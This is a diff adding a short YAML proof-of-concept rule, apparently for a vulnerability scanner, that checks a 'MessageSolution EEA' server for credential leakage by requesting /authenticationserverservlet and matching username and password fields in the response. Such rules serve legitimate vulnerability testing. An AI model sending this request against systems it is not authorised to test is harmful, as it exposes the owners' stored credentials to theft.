@@ -1,0 +1,16 @@
+name: yaml-poc-messagesolution-eea-leak-CT-158957
+binding: 630f5c15-c9b0-40a5-8c0f-db0205256e78
+detail:
+    author: system_user
+    vulnerability:
+        id: c548c196-ec1e-4ae7-b98f-c4a2f840018e
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /authenticationserverservlet
+        expression: response.status == 200 && "<username>(.*?)</username>".bmatches(response.body) && "<password>(.*?)</password>".bmatches(response.body)
+expression: r0()
